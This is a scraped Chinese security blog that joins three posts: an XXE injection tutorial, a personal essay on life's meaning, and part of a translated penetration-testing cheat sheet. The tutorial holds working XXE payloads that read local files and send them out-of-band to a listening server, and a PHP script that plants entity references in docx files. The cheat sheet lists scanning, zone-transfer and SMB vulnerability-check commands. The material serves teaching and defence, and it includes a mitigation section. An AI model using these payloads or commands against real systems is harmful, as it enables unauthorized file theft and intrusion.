利用参数XXE读取文件/访问网络 1 2 3 4 5 6 7 \u0026lt;?php $s=\u0026lt;\u0026lt;\u0026lt;string \u0026lt;!DOCTYPE a [\u0026lt;!ENTITY % b SYSTEM \u0026#34;http://127.0.0.1:8088/evil.txt\u0026#34;\u0026gt;%b;]\u0026gt; \u0026lt;c\u0026gt;\u0026amp;d;\u0026lt;/c\u0026gt; string; echo simplexml_load_string($s); // evil.txt : \u0026lt;!ENTITY d SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=C:/Windows/win.ini\u0026#34;\u0026gt; XXE OOB 如果没有回显也没关系，可以利用外部参数实体将文件内容发送出去。这里注意参数实体引用 %file; 必须放在外部文件里，因为根据这条 规则 ，在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错： PEReferences forbidden in internal subset 。这里的internal subset 指的是中括号[] 内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。\n感觉在技术方面英文的表达力更强，这种情况叫做 fetch external parsed entities using PEReference 更好理解。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $s=\u0026lt;\u0026lt;\u0026lt;string \u0026lt;!DOCTYPE a [\u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://127.0.0.1:8088/xxe.txt\u0026#34;\u0026gt; %xxe;]\u0026gt; string; simplexml_load_string($s); /* // http://127.0.0.1:8088/xxe.txt: \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=C:/Windows/win.ini\u0026#34;\u0026gt; \u0026lt;!ENTITY % x \u0026#39;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#34;http://127.0.0.1:8088/%file;\u0026#34;\u0026gt;\u0026#39;\u0026gt; %x; %send; */ 真实案例 在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发。 WooYun-2014-73321（网易邮箱某处XXE可读取文件） WooYun-2014-73439（QQ邮箱XXE可读取任意文件） \u0026hellip;\u0026hellip; 直接处理POST XML数据。WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）等很多。许多是直接 simplexml_load_string 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。 XML处理工具 WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。 WooYun-2015-134057（百度某平台Blind XXE漏洞\u0026amp;可Bool型SSRF攻击）XML检查工具。 WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具 WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。 WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。 WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。 WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。 WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。 WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。 WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 关于XXE,觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 ，我觉得有道理。xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。 WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件/home/run/ssh_go.sh ，内含SSH登陆密码 orz。 一些其他案例 XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook\u0026rsquo;s servers 【Facebook OpenID功能点的XRDS XXE】 Revisting XXE and abusing protocols 的分析者利用该原理在其他OpenID平台结合expect模块实现了RCE。 XXE on Windows system …then what ?? 【XXE+SMB=\u0026gt;内网RCE】 Apache Solr XXE漏洞分析 -【CVE-2018-8026 】 Phone Call to XXE via Interactive Voice Response 【打个电话也能XXE :)】 发现XXE 尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。\n单双引号 ' \u0026quot; 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。 尖括号\u0026lt; \u0026gt;。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。 注释符 \u0026lt;!-- 。XML使用 \u0026lt;!-- This is a comment --\u0026gt; 作注释。 \u0026amp; 。\u0026amp; 用于引用实体。 CDATA 分隔符]]\u0026gt; 。\u0026lt;![CDATA[foo]]\u0026gt; 中的内容不被parser解析，提前闭合引发异常。 尝试利用实体和DTD。\n引用外部DTD文件访问内网主机/端口。\u0026lt;!DOCTYPE a SYSTEM \u0026quot;http://127.0.0.1:2333\u0026quot;\u0026gt; （看响应时间） 引用外部DTD文件访问外网。\u0026lt;!DOCTYPE a SYSTEM \u0026quot;http://vps_ip\u0026quot; \u0026gt; 引用内部实体。\u0026lt;!DOCTYPE a [\u0026lt;!ENTITY xxe \u0026quot;findneo\u0026quot;\u0026gt;]\u0026gt;\u0026lt;a\u0026gt;\u0026amp;xxe;\u0026lt;/a\u0026gt; 外部实体读本地文件。\u0026lt;!DOCTYPE a [\u0026lt;!ENTITY xxe SYSTEM \u0026quot;file:///etc/hosts\u0026quot;\u0026gt;]\u0026gt;\u0026lt;a\u0026gt;\u0026amp;xxe;\u0026lt;/a\u0026gt; 外部实体访问内网主机/端口。\u0026lt;!DOCTYPE a SYSTEM \u0026quot;http://192.168.1.2:80\u0026quot;\u0026gt; （看响应时间） 外部实体访问外网。\u0026lt;!DOCTYPE a [\u0026lt;!ENTITY xxe SYSTEM \u0026quot;http://vps_ip\u0026quot;\u0026gt;]\u0026gt;\u0026lt;a\u0026gt;\u0026amp;xxe;\u0026lt;/a\u0026gt; 判断问题存在可以OOB提取数据。 生成恶意Word文档 上面提到的多个案例都需要用到自定义DTD的docx文件，有个名为 XXEGen 的在线网站可以方便地生成和监听（也可自定义监听地址），从而方便快速地测试XXE是否存在，但目前看来还不支持自定义DTD，如果需要用到OOB之类的技术，可能就不太方便。\n所以我写了个小脚本，可以用来生成一个正常docx文件，然后注入自定义的DTD和实体引用。另外新版的word软件默认禁用DTD，trigger 函数还可以本地测试下word文件是否有问题。\n其实修改 docx 文件的原理很简单，手动也可以做。解压 demo.docx 到 demo文件夹 ，直接修改 demo/word/document.xml 文件内容，全选 demo 文件夹中的文件，使用 7zip 的仅存储方式压缩成 demo2.docx 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php // by https://github.com/findneo function genword($filename,$filecontent){ $word = new COM(\u0026#34;word.application\u0026#34;) or die(\u0026#34;Unable to instantiate Word\u0026#34;); $word-\u0026gt;Visible = 0;//保持程序在后台运行 $word-\u0026gt;Documents-\u0026gt;Add();//新建Word文档 $word-\u0026gt;Selection-\u0026gt;TypeText($filecontent);//写入指定内容 $word-\u0026gt;Documents[1]-\u0026gt;SaveAs(getcwd().\u0026#34;/\u0026#34;.$filename);//保存到指定路径 $word-\u0026gt;Quit();//退出程序 } function poisonWord($filename,$flag,$dtd,$entity_reference) { $zip = new ZipArchive(); $zip-\u0026gt;open($filename); $xml=$zip-\u0026gt;getFromName(\u0026#39;word/document.xml\u0026#39;); $prolog=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\u0026#39;; $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);//构造恶意XML $zip-\u0026gt;deleteName(\u0026#39;word/document.xml\u0026#39;); $zip-\u0026gt;addFromString(\u0026#34;word/document.xml\u0026#34;,$evilxml);//更新docx文件 $zip-\u0026gt;close(); } function trigger($filename){ $zip = new ZipArchive(); $zip-\u0026gt;open($filename); $xml=$zip-\u0026gt;getFromName(\u0026#39;word/document.xml\u0026#39;); $doc_xml = new DOMDocument(); $doc_xml-\u0026gt;loadXML($xml); //加载word文档 $zip-\u0026gt;close(); return $doc_xml-\u0026gt;textContent; //读取文档内容 } //在这里定义想要添加的DTD内容和想要在XML中引用的实体 $dtd=\u0026#39;\u0026lt;!DOCTYPE ANY [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://127.0.0.1:8088/?findneo\u0026#34;\u0026gt;\u0026lt;!ENTITY int \u0026#34;XXE\u0026#34;\u0026gt;]\u0026gt;\u0026#39;; $entity_reference=\u0026#34;\u0026amp;xxe; \u0026amp;int; IS EXCITING!\u0026#34;; $name=\u0026#34;demo.docx\u0026#34;;//生成文件的文件名 $flag=\u0026#34;Across the Great Wall we can reach every corner in the world.\u0026#34;;//文件内容，实体在该内容附近引用。 genWord($name,$flag);//生成一个指定内容和文件名的正常docx文件 poisonWord($name,$flag,$dtd,$entity_reference);//向正常文件注入DTD和实体引用，生成恶意文件 echo trigger($name);//加载文件，测试效果 //若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径 //extension=\u0026#34;php_com_dotnet.dll 路径\u0026#34;; extension=\u0026#34;php_mbstring.dll 路径\u0026#34; ?\u0026gt; 此外，Github项目 oxml_xxe 支持更多文件类型。\n防御 彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 。\n禁用外部实体 ( http://cn2.php.net/libxml_disable_entity_loader 等) 对于PHP来说，尽管不同环境下simplexml_load_string() 默认行为并不一致，但为了安全应当总是libxml_disable_entity_loader(); 。 检验数据来源，过滤数据 PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，libxml2 Version 可以在phpinfo里看，本文使用的是2.7.8 。\n这可能是一个误解的结果。\n在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因：\n1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。\n2.官方尚未注意到这个问题。\n感觉前者的可能性较大。\n—— wooyun-2015-0156208\n可以结合 change log 和 GitHub commit 了解 libxml2 各版本具体改动。\n可以看到与主题较相关的有：\n1 2 3 4 5 6 7 8 9 10 11 v2.9.5: Sep 04 2017 Security:Detect infinite recursion in parameter entities (Nick Wellnhofer) Prevent unwanted external entity reference v2.9.2: Oct 16 2014 Security: Fix for CVE-2014-3660 billion laugh variant (Daniel Veillard), CVE-2014-0191 Do not fetch external parameter entities (Daniel Veillard) 2.9.1: Apr 19 2013 Activate detection of encoding in external subset 2.9.0: Sep 11 2012 Do not fetch external parsed entities 扩展阅读 XML Out-Of-Band Data Retrieval XMLDTDEntityAttacks.pdf XML External Entity (XXE) Processing 未知攻焉知防——XXE漏洞攻防 DTD Cheat Sheet DTD - Syntax Information Security / infosec / XXE XXE_payloads DTD Tutorial Extensible Markup Language (XML) 1.0 (Fifth Edition) about XML entity at msdn Spring MVC xml绑定pojo造成的XXE （乌云papers-1911） Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035） ","permalink":"https://ret2neo.cn/post/180811-xxe-injection/","summary":"本文发自 先知社区 ，转载请注明出处。\n（ 这个问题资料很多了，细节也颇多，本文涉及的内容只是最基本的，描述得也难比以往的好，仅仅是记录所学。对于已经理解XXE基本情况的读者，阅读真实案例和生成恶意Word文档两部分可能会有收获。）\nWHAT XML XML是类似HTML的标记语言，但它们有所不同。\n其一，HTML用于表现数据，关注数据的表现形式，XML用于存储和传输数据，关注数据本身。 其二，HTML的标签是预定义的，而XML的标签是自定义的，或者说，任意的。 此外，XML语法更严格，其标签必须闭合且正确嵌套，大小写敏感，属性值必须加引号，保留连续空白符。 \u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;yes\u0026quot;?\u0026gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 DTD XML元素以形如 \u0026lt;tag\u0026gt;foo\u0026lt;/tag\u0026gt; 的标签开始和结束，如果元素内部出现如\u0026lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义了五个实体引用，即用\u0026amp;lt; \u0026amp;gt; \u0026amp;amp; \u0026amp;apos; \u0026amp;quot; 替换 \u0026lt; \u0026gt; \u0026amp; ' \u0026quot; 。\n实际上，实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。DTD是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。\nDTD有两种形式：\n1 2 3 4 5 内部 DTD：\u0026lt;!DOCTYPE 根元素 [元素声明]\u0026gt; 外部 DTD： \u0026lt;!DOCTYPE 根元素 SYSTEM \u0026#34;存放元素声明的文件的URI，可以是本地文件或网络文件\u0026#34; [可选的元素声明]\u0026gt; \u0026lt;!DOCTYPE 根元素 PUBLIC \u0026#34;PUBLIC_ID DTD的名称\u0026#34; \u0026#34;外部DTD文件的URI\u0026#34;\u0026gt; （ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI） ENTITY 我们可以在元素声明中自定义实体，和DTD类似也分为内部实体和外部实体，此外还有普通实体和参数实体之分：","title":"XML外部实体注入小结"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 meaning = 1 while 1: try: assert (meaning) # meaning = 0 search_meaning() except: jump_into_real_life() work() enjoy() contribute() 我开始觉得，人只有不再执着于意义、价值之类的词汇和思考方式，才能去做一些实在的事情，才能融入生活。人应当甘心于局限性，同时欣赏存在本身的不可思议，去体验欲望，去追逐欲望被满足的快乐，去感受欲望不被满足的痛苦，去心平气和地面对存在的短暂，去力所能及地帮助其他存在。\n我逐渐认识到，诚实是最根本的，也是最有力量的。诚实地思考让人摆脱无谓的幻想，有条理地诚实地思考使人不被惯用的思维方式或是语言习惯蒙蔽；诚实的发言常常没什么好处，它最大的作用是保全了诚实的本性，保证一个渴望诚实的人行为的一致性，使其避免自我矛盾带来的痛苦。诚实的思考使人彻底地接受凡人皆有一死，不再费尽心思以各种方式思考与追求永恒不朽云云，不再绞尽脑汁从各种角度论证不朽的可能性。\n计划在这里收集整理一些在我看来值得尊敬的人对生活意义的探讨。\n罗素——爱、知识与慈悲心 WHAT I HAVE LIVED FOR\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Description: This is the prologue to the Autobiography of Bertrand Russell, written on 25 July 1956 in his own hand. The text follows: PROLOGUE. WHAT I HAVE LIVED FOR. Three passions, simple but overwhelmingly strong, have governed my life: the longing for love, the search for knowledge, and unbearable pity for the suffering of mankind. These passions, like great winds, have blown me hither and thither, in a wayward course, over a deep ocean of anguish, reaching to the very verge of despair. I have sought love, first, because it brings ecstasy -- ecstasy so great that I would often have sacrificed all the rest of life for a few hours of this joy. I have sought it, next, because it relieves loneliness -- that terrible loneliness in which one shivering consciousness looks over the rim of the world into the cold unfathomable lifeless abyss. I have sought it, finally, because in the union of love I have seen, in a mystic miniature, the prefiguring vision of the heaven that saints and poets have imagined. This is what I sought, and though it might seem too good for human life, this is what -- at last -- I have found. With equal passion I have sought knowledge. I have wished to understand the hearts of men. I have wished to know why the stars shine. And I have tried to apprehend the Pythagorean power by which number holds sway above the flux. A little of this, but not much, I have achieved. Love and knowledge, so far as they were possible, led upward toward the heavens. But always pity brought me back to earth. Echoes of cries of pain reverberate in my heart. Children in famine, victims tortured by oppressors, helpless old people a hated burden to their sons, and the whole world of loneliness, poverty, and pain make a mockery of what human life should be. I long to alleviate the evil, but I cannot, and I too suffer. This has been my life. I have found it worth living, and would gladly live it again if the chance were offered me. Archive Box Number: Black Display Binder Date: 1956 */ 本人拙劣译文：\n1 2 3 4 5 6 7 8 9 10 11 12 /* 这是《罗素自传》的序，1956年7月25日亲笔。文字如下： 三种简单却极强烈的情感引领着我的生活：对爱的渴望，对知识的渴求和对苦难众生的怜悯。 我最初寻求爱情，因为它带来那种令人愿用余生换取哪怕片刻的狂喜，更因为它消弭独自面对死亡的孤寂。我从爱情中看到诗人们描绘的天堂，听起来有些夸张，但的确如我所见。 我以同样的热情追求知识，我想理解人心，想明白星空为何闪烁，我试图理解毕达哥拉斯那数字主宰一切的力量。我所得不多，但聊胜于无。 爱情与知识使我仰望星空，怜悯使我脚踏实地。痛苦的哭声在我心中回荡。饥饿的儿童，被折磨的受压迫者，子孙不孝的无望老人，和整个由孤独、贫穷和苦难构成的世界，无一不是对人类命运的嘲讽。我想要普渡众生，但实际上做不到，因为我也正受着苦难。 这就是我的一生，它值得一过。如果有机会，我愿意重来一遍。 */ 参考阅读：《活着的三个理由》\n胡适——社会不朽 《我的信仰 》\n胡适，中国新文化运动的开拓者之一。美国《展望》杂志曾经把他列为当今世界有影响力的100 个伟人之一。 1891年12月生 ，父亲胡珊是经学家（殁于 1895 年），母亲是观音的虔诚信士（殁于 1918 年）。生长在拜偶像的环境，习于诸神凶恶丑怪的面孔，和天堂地狱的民间传说 。 1895-1904在村塾读书九年，读习记诵《孝经》、《小学》、四书五经。此间兼读《资治通鉴》、《水浒传》。 1902年（是年胡适11岁），从接触《小学》引用的司马光的形灭神散论开始怀疑死后审判的观念 。此后不久从《资治通鉴》接触范缜的神灭论及其对因果轮回的反对，很喜欢，从此成了无神论者， 摆脱了恶梦似的因果绝对论 ，开始相信偶然而非宿命。 1904-1910在沪六年。 接触基本的自然科学、欧洲小说、中国上中古哲学作品，喜欢墨翟的兼爱说和老庄有自然色彩的哲学。从梁启超文字中接触西方哲学，醒悟中国除自然科学和商业外，思想上也不比西方。后读《天演论》、《自由论》，接触进化论，联想起《列子》的天地万物，类无贵贱。 1907年（16岁），为《竞业旬报 》 做编辑，猛力攻击人民的迷信，且坦然主张毁弃神道，兼持无神论 。 1908年（17岁），家道中落，停学一年，先后教授初等英文、国学以补贴家用。 1909-1910受时事影响，意气消沉，悲观厌世，喝酒作诗，赌博看戏，流浪放荡。一次酒后斗殴进监后，决心脱离现状。苦学一月，前往北京投考用美国退还庚子赔款所设的学额 ，是年七月赴美。 1910-1917在美七年。早期意气颓唐，几乎读完圣经，1911年几乎要做基督徒。 我到美国，满怀悲观。但不久便交结了些朋友，对于那个国家和人民都很喜爱。 美国人出自天真的乐观与朝气给了我很好的印象。在这个地方，似乎无一事一物不 能由人类智力做得成的。我不能避免这种对于人生持有喜气的眼光的传染，数年之 间，就渐渐治疗了我少年老成的态度。 1914年1月（23岁），日记：我相信我自离开中国后，所学 得的最大的事情，就是这种乐观的人生哲学了。” 1914年世界大战爆发，为比利时命运所动，又兼接触过老子的“水善应万物而不争”和基督教的《登山宝训》，逐渐信仰不抵抗、平和主义和国际大同主义。 读易卜生、莫黎和赫胥黎 的著作，相信人应当诚实思考、诚实发言。 从杜威教授学到人生最神圣的责任是努力思想得好 。 1915-1917在哥伦比亚大学师从杜威，重读中国古代哲学，成论文《先秦名学史》。 1918年（27岁），其母逝世，促成次年发表《不朽》，总结多年探索得出的人生信条。从检阅父母生平中开始相信一切事物相互影响以致永存，所以一切所作都是不朽。又经过一系列的推想，开始信了可以称为社会不朽的宗教 。小我会死，但其所作所为，无论善恶，都将在大我身上以各种方式传播，以某种形式永垂不朽。 1923年（32岁）发表《科学与人生观》 ，讲述社会不朽这个“新宇宙观和新人生观的轮廓” 。引发国内思想界长达一年的论战。 ‘科学的人生观’/‘自然主义的人生观’：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /* （1 ）根据于天文学和物理学的知识，叫人知道空间的无限之大。 （2 ）根据于地质学及古生物学的知识，叫人知道时间的无穷之长。 （3 ）根据于一切科学，叫人知道宇宙及其中万物的运行变迁皆是自然的，——自己如此的，——正用不着什么超自然的主宰或造物者。 （4 ）根据于生物学的科学知识，叫人知道生物界的生存竞争的浪费与惨酷，——因此叫人更可以明白那“有好生之德”的主宰的假设是不能成立的。 （5 ）根据于生物学、生理学、心理学的知识，叫人知道人不过是动物的一种；他和别种动物只有程序的差异，并无种类的区别。 （6 ）根据于生物的科学及人类学、人种学、社会学的知识，叫人知道生物及人类社会演进的历史和演进的原因。 （7 ）根据于生物的及心理的科学，叫人知道一切心理的现象都是有因的。 （8 ）根据于生物学及社会学的知识，叫人知道道德礼教是变迁的，而变迁的原因都是可以用科学的方法寻求出来的。 （9 ）则根据于新的物理化学的知识，叫人知道物质不是死的，是活的；不是静的，是动的。 （10）根据于生物学及社会学的知识，叫人知道个人——“小我”——是要死灭的，而人类——“大我”——是不死的，不朽的；叫人知道“为全种万世而生活”就是宗教，就是最高的宗教。而那些替个人谋死后的“天堂”“净土”的宗教，乃是自私自利的宗教。 */ 《球状闪电》——着迷论 “人生啊，人生这东西……”爸爸一口气喝干了一大杯酒，眼睛直勾勾地看者那一小群火苗说，“变幻莫测，一切都是概率和机遇，就像在一条小溪中漂着的一根小树枝，让一块小石头绊住了，或让一个小旋涡圈住了……”\n“孩子还小，听不懂这些。”妈妈说。\n“他不小了！”爸爸说，“他已经到了可以知道人生真相的时候了！”\n“你自己好象知道似的。”妈妈带着嘲讽的笑说。\n“我知道，当然知道！”爸爸又干了半杯酒，然后转向我，“其实，儿子，过一个美妙的人生并不难，听爸爸教你：你选一个公认的世界难题，最好是只用一张纸和一只铅笔的数学难题，比如歌德巴赫猜想或费尔马大定理什么的，或连纸笔都不要的纯自然哲学难题，比如宇宙的本源之类，投入全部身心钻研，只问耕耘不问收获，不知不觉的专注中，一辈子也就过去了。人们常说的寄托，也就是这么回事。或是相反，把挣钱作为惟一的目标，所有的时间都想着怎么挣，也不问挣来干什么用，到死的时候像葛朗台一样抱者一堆金币说：啊，真暖和啊……所以，美妙人生的关键在于你能迷上什么东西。比如我——”爸爸指指房间里到处摆放着的那些小幅水彩画，它们的技法都很传统，画得中规中矩，从中看不出什么灵气来。这些画映着窗外的电光，像一群闪动的屏幕，“我迷上了画画，虽然知道自己成不了梵高。”\n“是啊，理想主义者和玩世不恭的人都觉得对方很可怜，可他们实际都很幸运。”妈妈若有所思地说。\n平时成天忙碌的爸妈这时都变成了哲学家，倒好象这是他们在过生日。\n“妈，别动！”我说着，从妈妈看上去乌黑浓密的头发中拔出一根白头发，只白了一半，另一半还黑着。\n爸爸拿着那根头发对着灯看了看，闪电中，它像灯丝似的发出光来：“据我所知，这是你妈妈有生以来长出的第一根白发，至少是第一次发现。”\n“干什么嘛你！拔一根要长七根的！”妈妈把头发甩开，恼怒地说。\n“唉，这就是人生了。”爸爸说，他指着蛋糕上的蜡烛，“想想你拿着这么一根小蜡烛，放到戈壁滩上去点燃它，也许当时没风，真让你点着了，然后你离开，远远地你看者那火苗有什么感觉？孩子，这就是生命和人生，脆弱而飘忽不定，经不起一丝微风。”\n我们三个都默默无语地看着那一簇小火苗，看着它们从窗外射入的冰冷的青色电光中颤抖，像是看着我们精心培育的一窝小生命。\n窗外又一阵剧烈闪电。\n——《球状闪电》\n相比于罗素和胡适仍对外部世界充满希望的论调，我其实更喜欢大刘这种向内挖掘的透彻。我认为这应该是虚无主义者的一条出路，或者称不上出路，是一种冲突感较弱、可自洽的生活方式。一切的意义不在于从外部获得什么，或是为外部贡献什么。能够得出这样的论断本身是悲观之至的，对社会不朽和知识耀眼是一笑而过的。沉迷是唯一可选择的，因为沉迷意味着忘却其他，这些被忘却的其他里最应该被忘却的是存在焦虑、存在有限带来的困扰、无意义的苦恼。这是一种正当的及时行乐，是那些始终质疑一切，无所相信的人，所可选择的一种生活方式。\n我想，最焦虑的是寻觅，最幸运的是着迷。说幸运有些奇怪了，着迷应当是一种可以被创造出来的东西，只要剔除杂质，内心澄澈即可，这对于在虚无边缘徘徊的人应当是更容易做到的。我应当去专注于所愿意，更幸运地，所喜欢做的事情，不论是否能够有所成就。至少这可以让我平静地面对存在有限所带来的局促不安，让我在短暂的片段中忘却生命的虚无。当这些片段越来越多，我所能从中收获的也将越来越多。到那时我也许对生活会有不同的看法，不再觉得沉迷在某一样物事或某一个人身上是从无处不在的虚无感中逃避的方式。也许随着阅历增长，我还会对一切生起感恩，真正理解其宝贵。即便将来的我对人生的看法依然没有什么改变，这种沉迷在事物中的生活在现在看起来也是一种很不错的存在方式。\n","permalink":"https://ret2neo.cn/mind/180731-philosophical-suicide/","summary":"1 2 3 4 5 6 7 8 9 10 11 meaning = 1 while 1: try: assert (meaning) # meaning = 0 search_meaning() except: jump_into_real_life() work() enjoy() contribute() 我开始觉得，人只有不再执着于意义、价值之类的词汇和思考方式，才能去做一些实在的事情，才能融入生活。人应当甘心于局限性，同时欣赏存在本身的不可思议，去体验欲望，去追逐欲望被满足的快乐，去感受欲望不被满足的痛苦，去心平气和地面对存在的短暂，去力所能及地帮助其他存在。\n我逐渐认识到，诚实是最根本的，也是最有力量的。诚实地思考让人摆脱无谓的幻想，有条理地诚实地思考使人不被惯用的思维方式或是语言习惯蒙蔽；诚实的发言常常没什么好处，它最大的作用是保全了诚实的本性，保证一个渴望诚实的人行为的一致性，使其避免自我矛盾带来的痛苦。诚实的思考使人彻底地接受凡人皆有一死，不再费尽心思以各种方式思考与追求永恒不朽云云，不再绞尽脑汁从各种角度论证不朽的可能性。\n计划在这里收集整理一些在我看来值得尊敬的人对生活意义的探讨。\n罗素——爱、知识与慈悲心 WHAT I HAVE LIVED FOR\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Description: This is the prologue to the Autobiography of Bertrand Russell, written on 25 July 1956 in his own hand.","title":"回头是岸"},{"content":"渗透测试工具备忘录 本文翻译自 Penetration Testing Tools Cheat Sheet ，首发先知社区 ，转载请注明链接。\n简介 渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。\n本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。\n文中缺漏之处欢迎 推特 私戳。\n更新日志： 17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。\n开始前 网络配置 设置IP 地址 1 ifconfig eth0 xxx.xxx.xxx.xxx/24 子网划分 1 2 ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 公开来源情报 被动信息收集 DNS WHOIS 枚举 1 whois domain-name-here.com 查询DNS IP 1 dig a domain-name-here.com @nameserver 查询MX记录 1 dig mx domain-name-here.com @nameserver 用DIG 查询域传送 1 dig axfr domain-name-here.com @nameserver DNS 域传送 命令 解释 nslookup -\u0026gt; set type=any -\u0026gt; ls -d blah.com Windows DNS域传送 dig axfr blah.com @ns1.blah.com Linux DNS 域传送 邮件 Simply Email 使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。\n1 2 git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TARGET-DOMAIN 半主动信息收集 基本指纹识别 手动指纹识别/banner抓取\n命令 解释 nc -v 192.168.1.1 25 telnet 192.168.1.1 25 通过显示banner识别版本和指纹 使用NC抓取banner 1 2 3 4 5 6 nc TARGET-IP 80 GET / HTTP/1.1 Host: TARGET-IP User-Agent: Mozilla/5.0 Referrer: meh-domain \u0026lt;enter\u0026gt; 主动信息收集 DNS 爆破 DNSRecon DNS Enumeration Kali - DNSRecon root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std \u0026ndash;xml ouput.xml 端口扫描 Nmap命令 更多命令，详见 Nmap备忘录 。\n基本Nmap 命令：\n命令 解释 nmap -v -sS -A -T4 target 详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪 nmap -v -sS -p--A -T4 target 同上，且扫描所有TCP端口，耗时更长 nmap -v -sU -sS -p- -A -T4 target 同上，且扫描所有UDP端口，耗时巨长 nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X 扫描可能包含漏洞的SMB服务 ` ls /usr/share/nmap/scripts/* grep ftp ` 别在外网采用T4 扫描，使用TCP 连接扫描时用T2 比较合适。T4 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用T4/T5 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。\nNmap UDP扫描 1 nmap -sU TARGET UDP 协议扫描器 1 git clone https://github.com/portcullislabs/udp-proto-scanner.git 扫描文件中IP地址的所有服务\n1 ./udp-protocol-scanner.pl -f ip.txt 扫描特定UDP服务\n1 udp-proto-scanner.pl -p ntp -f ips.txt 其他主机发现 不使用nmap发现主机的方法：\n命令 解释 netdiscover -r 192.168.1.0/24 